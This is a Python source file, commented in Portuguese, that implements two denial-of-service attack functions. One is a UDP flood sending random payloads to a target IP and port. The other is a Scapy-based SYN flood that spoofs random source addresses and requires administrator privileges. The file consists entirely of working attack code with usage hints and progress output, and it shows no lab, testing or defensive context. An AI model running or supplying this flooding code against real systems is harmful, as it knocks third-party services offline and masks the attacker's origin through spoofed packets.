import socket
import random
import time
import sys

# Tenta importar o Scapy. Se falhar, o programa não crasha logo.
try:
    from scapy.all import IP, TCP, send, RandShort, RandIP
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# --- UDP FLOOD (Já existente) ---
def udp_flood(target_ip, target_port, duration):
    """
    Envia pacotes UDP aleatórios (DoS).
    """
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1024)
    timeout = time.time() + duration
    sent_packets = 0

    print(f"\n[*] A iniciar UDP Flood para {target_ip}:{target_port}")
    print(f"[*] Duração: {duration}s. Ctrl+C para parar.")

    try:
        while time.time() < timeout:
            client.sendto(bytes_to_send, (target_ip, target_port))
            sent_packets += 1
            if sent_packets % 1000 == 0:
                print(f"\r[+] Pacotes enviados: {sent_packets}", end="")
    except KeyboardInterrupt:
        print("\n[!] Interrompido.")
    except Exception as e:
        print(f"\n[!] Erro: {e}")
    finally:
        client.close()
        print(f"\n[*] Total UDP enviados: {sent_packets}")

# --- SYN FLOOD (Novo) ---
def syn_flood(target_ip, target_port, num_packets):
    """
    Envia pacotes TCP SYN usando Scapy.
    Requer privilégios de Administrador.
    """
    if not SCAPY_AVAILABLE:
        print("\n[!] ERRO: A biblioteca 'scapy' não está instalada.")
        print("Instale com: pip install scapy")
        return

    print(f"\n[*] A iniciar SYN Flood contra {target_ip}:{target_port}")
    print(f"[*] Pacotes a enviar: {num_packets}")
    print("[!] Nota: No Windows, pode ser necessário instalar o Npcap.")
    
    count = 0
    try:
        for i in range(num_packets):
            # Criação do Pacote
            # IP: Origem falsa (RandIP) -> Destino Real
            # TCP: Porto origem aleatório -> Porto destino Real | Flag S (SYN)
            ip_layer = IP(src=str(RandIP()), dst=target_ip)
            tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
            packet = ip_layer / tcp_layer

            # Envia o pacote (verbose=0 para não encher o ecrã)
            send(packet, verbose=0)
            
            count += 1
            if count % 10 == 0:
                print(f"\r[+] Pacotes SYN enviados: {count}", end="")
                
    except KeyboardInterrupt:
        print("\n[!] Ataque interrompido.")
    except PermissionError:
        print("\n[!] ERRO: É necessário correr o terminal como ADMINISTRADOR.")
    except Exception as e:
        print(f"\n[!] Erro no Scapy: {e}")
    
    print(f"\n[*] Ataque terminado. Total enviado: {count}")